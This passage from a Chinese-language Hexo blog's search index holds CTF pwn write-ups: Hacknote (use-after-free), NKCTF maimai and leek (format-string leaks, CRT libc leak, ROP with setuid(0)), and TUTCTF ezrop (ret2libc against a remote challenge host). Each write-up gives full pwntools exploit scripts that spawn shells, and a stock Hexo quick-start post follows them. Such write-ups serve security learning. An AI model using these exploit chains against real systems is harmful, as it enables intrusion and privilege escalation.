src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BLitCTF%202023%5D%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85~.1.png"></p><h2 id="NISACTF-2022-Hacknote"><a href="#NISACTF-2022-Hacknote" class="headerlink" title="[NISACTF 2022]Hacknote"></a>[NISACTF 2022]Hacknote</h2><p>因为free掉note和content之后，没有将指针置空，所以导致了UAF漏洞</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.2.png"></p><p>由于LIFO原则，也就是后进先出，我们这次申请到的第一个note_chunk_2，其实是上次的note_chunk_1，而content_chunk_2，实际上是上一次的note_chunk_0，通过content_chunk_2的content，我们可以写入我们需要执行的命令，magic函数</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.3.png"></p><p>content也就是magic函数的地址,覆盖print_note_content函数的指针，成功劫持了程序控制流</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context(os="linux", arch="i386", log_level="debug")p = process('./pwn')def add(size_c, content):    p.recvuntil(b'choice :')    p.sendline(b'1')    p.recvuntil(b'size :')    p.sendline(str(size_c))    p.recvuntil(b'Content :')    p.sendline(content)  def free(index):    p.recvuntil(b'choice :')    p.sendline(b'2')    p.recvuntil(b'Index :')    p.sendline(str(index))  def print(index):    p.recvuntil(b'choice :')    p.sendline(b'3')    p.recvuntil(b'Index :')    p.sendline(str(index)) magic_addr = 0x8048945 add(16, b'aaaaaa')add(16, b'aaaaaa') free(0)free(1) add(8, p32(magic_addr))print(0)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.1.png"></p><h2 id="NKCTF-2024-maimai"><a href="#NKCTF-2024-maimai" class="headerlink" title="[NKCTF 2024] maimai"></a>[NKCTF 2024] maimai</h2><p>一道难度中等的栈溢出题目。有两个漏洞，一个是符合分数要求的格式化字符串漏洞来泄露<code>libc</code>和<code>canary</code>，另一个是read函数的栈溢出</p><p>需要注意一下，本地打通之后在远端并不能拿到root权限,只是一个低权限shell，<code>ls -al</code>之后看到pwn程序有s权限，这时候可以找到setuid权限，可以在ROP链中加入setuid(0)即可提权。或者第二种方法orw做题(做出来第二种方法再更)</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(log_level="debug",arch="amd64")#p = remote("node5.anna.nssctf.cn",28645)p = process("./pwn")elf = ELF("./pwn")libc = ELF('./libc.so.6')p.recvuntil("Select a option:")p.sendline(b'1')for i in range(0,50):p.sendline(b'15.0 SS')p.recvuntil("Select a option:")p.sendline(b'2')p.sendlineafter("Input your nickname.\n",b'%7$p')p.recvuntil(b'0x')canary = int(p.recv(16), 16)log.info('canary'+':'+hex(canary))#gdb.attach(p)#pause()p.sendafter(b"Can you teach me how to play maimai?\n",b'1')p.sendlineafter(b'option:', b'2')p.sendafter(b'nickname.\n', "%13$p")p.recvuntil(b'0x')libc.address = int(p.recv(12), 16) - 0x29d90log.info('libc.address'+':'+hex(libc.address))pop_rdi = libc.address + 0x2a3e5ret = libc.address + 0x29139system = libc.sym['system']binsh = next(libc.search(b'/bin/sh'))setuid = libc.sym['setuid']payload = b'a' * (0x28) + p64(canary) + b'a' * 8 + p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(binsh) + p64(system)p.sendafter(b'maimai?', payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNKCTF%202024%5Dmaimai.1.png"></p><h2 id="NKCTF-2024-leek"><a href="#NKCTF-2024-leek" class="headerlink" title="[NKCTF 2024] leek"></a>[NKCTF 2024] leek</h2><p>pwn和密码的结合(这次比赛好多结合体，要拓宽方向了)</p><p>中国剩余定理</p><p>题目一开始允许输入6字节,并将这6个数字作为模返stdout的余数,并同时返回一个栈指针的尾地址</p><p>通过适当输入6个素数和返回的地址可以得到libc地址(通过CRT),得到的值比真实libc要小需要加模爆破64位系统，libc的加载地址首字节0x7f(大多数情况下)，尾部12位固定不变，所以可以通过首字节确定爆破的结果是否正确,当首字节为0x7f尾12位相同时可以确定libc地址和版本。</p><p>之后通过一字节的溢出，把libc地址放在指针后面</p><p>memcpy时将payload复制到返回地址位置来实现ROP</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from sympy.ntheory.modular import crtcontext(arch='amd64', log_level='debug')libc = ELF('./libc.so.6')p = process('./leak')#gdb.attach(p, "b*0x555555555296\nc")ps = [101,103,107,109,113,127]cs = [0]*6p.sendafter(b'\n',bytes(ps))for i inrange(6):    cs[i] = p.recv(1)[0]stack = p.recv(1)[0]stdout,pd = crt(ps,cs)stdout,pd = int(stdout),int(pd)print(hex(stdout), hex(pd))while stdout&amp;0xfff != 0x760:    stdout+=pd libc.address = stdout - libc.sym['_IO_2_1_stdout_']print(f'{libc.address = :x}')print(stdout)pop_rdi = libc.address + 0x27725 #0x2a3e5bin_sh = next(libc.search(b'/bin/sh\0'))system = libc.sym['system']print(f"{pop_rdi:x}{bin_sh:x}{system:x}")print(pop_rdi,bin_sh,system)pay = flat(pop_rdi+1, pop_rdi, bin_sh, system) + p8((stack+0x58)&amp;0xff)p.send(pay)print(stdout)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="TUTCTF-pwn-ezrop"><a href="#TUTCTF-pwn-ezrop" class="headerlink" title="TUTCTF pwn ezrop"></a>TUTCTF pwn ezrop</h2><pre class="line-numbers language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可" data-language="checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可"><code class="language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可">```pyfrom pwn import *from LibcSearcher import *#p = process('./pwn')p = remote('36.212.170.17', 9997)libc = ELF('./libc.so.6')elf = ELF('./pwn')padding = 0x98puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x4011FCpop_rdi_ret = 0x401183ret = 0x40101apayload = b'a' * paddingpayload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main_addr)p.sendline(payload)p.recvline()puts_real = u64(p.recvline()[:-1].ljust(8, b'\x00'))print(hex(puts_real))libc_base = puts_real - libc.symbols['puts']system_addr = libc_base + libc.symbols['system']bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))print(hex(libc_base))print(hex(system_addr))print(hex(bin_sh_addr))# gdb.attach(p)payload2 = b'a' * paddingpayload2 += p64(ret)payload2 += p64(pop_rdi_ret)payload2 += p64(bin_sh_addr)payload2 += p64(system_addr)p.sendline(payload2)# sleep(1)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typora-vue-theme主题介绍</title>
      <link href="/2018/09/07/hello-world/"/>
      <url>/2018/09/07/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new "My New Post"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
